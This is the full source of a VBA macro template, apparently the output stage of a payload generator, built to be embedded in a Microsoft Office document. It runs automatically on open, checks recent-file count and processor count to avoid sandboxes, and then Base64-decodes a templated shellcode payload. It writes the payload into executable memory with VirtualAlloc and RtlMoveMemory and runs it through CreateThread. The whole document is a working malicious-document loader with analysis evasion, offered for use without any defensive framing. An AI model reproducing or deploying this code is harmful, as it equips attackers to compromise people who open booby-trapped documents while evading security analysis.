' This VBA macro is designed to be embedded in a Microsoft Office document.
' It includes basic sandbox evasion checks before decoding and executing shellcode.

Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As LongPtr, ByVal dwCreationFlags As Long, lpThreadId As LongPtr) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "ntdll" (Destination As LongPtr, Source As Any, ByVal Length As Long) As LongPtr

Sub AutoOpen()
    ' This function is automatically called when the document is opened.
    Main
End Sub

Sub Document_Open()
    ' Alternative auto-start method
    Main
End Sub

Function Main()
    ' --- SANDBOX EVASION ---
    ' 1. Check if the document is opened in a sandboxed/analysis environment
    On Error Resume Next ' Basic error handling for sandbox checks
    If Application.RecentFiles.Count < 2 Then
        Exit Function ' Too few recent files, likely a sandbox
    End If

    ' 2. Check for low processor count
    Dim numProcessors As Integer
    numProcessors = CInt(Environ("NUMBER_OF_PROCESSORS"))
    If Err.Number <> 0 Then ' Environ might fail or return non-numeric in some sandboxes
        numProcessors = 1 ' Assume low processor count if check fails
        Err.Clear
    End If
    If numProcessors < 2 Then
        Exit Function ' Most modern systems have at least 2 cores
    End If
    On Error GoTo 0 ' Reset error handling

    ' --- PAYLOAD EXECUTION ---
    ' The 'payload_b64' variable will be populated by the Python script.
    ' The 'shellcode_hex' is also a placeholder, but Base64 is used below.
    ' Dim payloadHex As Variant
    ' payloadHex = Array({{ shellcode_hex }}) ' This line might be unused if Base64 is primary

    Dim b64payload As String
    b64payload = "{{ payload_b64 }}"

    If Len(b64payload) = 0 Then
        Exit Function ' No payload provided
    End If

    Dim decodedPayload() As Byte
    On Error Resume Next ' Handle potential errors during decoding or API calls
    decodedPayload = Base64Decode(b64payload)
    If Err.Number <> 0 Then
        Exit Function ' Base64 decoding failed
    End If
    On Error GoTo 0

    If (Not decodedPayload) Or (UBound(decodedPayload) < LBound(decodedPayload)) Then
        Exit Function ' Decoded payload is empty or invalid
    End If
    
    Dim memAddr As LongPtr
    Dim threadId As LongPtr
    Dim payloadSize As Long
    
    payloadSize = UBound(decodedPayload) - LBound(decodedPayload) + 1

    ' Allocate memory for the shellcode
    memAddr = VirtualAlloc(0, payloadSize, &H3000, &H40) ' MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    
    If memAddr = 0 Then
        Exit Function ' VirtualAlloc failed
    End If

    ' Copy shellcode into the allocated memory
    RtlMoveMemory memAddr, decodedPayload(LBound(decodedPayload)), payloadSize
    
    ' Execute the shellcode in a new thread
    Dim hThread As LongPtr
    hThread = CreateThread(0, 0, memAddr, 0, 0, threadId)

    If hThread = 0 Then
        ' If CreateThread fails, try to clean up allocated memory
        ' VirtualFree memAddr, 0, MEM_RELEASE (Declare VirtualFree if needed)
        Exit Function
    End If
    
    ' Optionally, wait for the thread or close the handle if not needed.
    ' For shellcode, typically we don't wait.
End Function

Function Base64Decode(ByVal base64String As String) As Byte()
    ' Helper function to decode Base64 string.
    ' This implementation uses MSXML2.DOMDocument.
    Dim objXML As Object ' Use late binding: As Object
    Dim objNode As Object ' Use late binding: As Object
    
    On Error GoTo CleanFail
    
    Set objXML = CreateObject("MSXML2.DOMDocument")
    If objXML Is Nothing Then GoTo CleanFail
    
    Set objNode = objXML.createElement("b64")
    If objNode Is Nothing Then GoTo CleanFail
    
    objNode.DataType = "bin.base64"
    objNode.Text = base64String
    Base64Decode = objNode.nodeTypedValue
    
CleanExit:
    Set objNode = Nothing
    Set objXML = Nothing
    Exit Function
CleanFail:
    ' Return an empty byte array or handle error appropriately
    ' For simplicity, let error propagate or be handled by caller's On Error Resume Next
    Resume CleanExit
End Function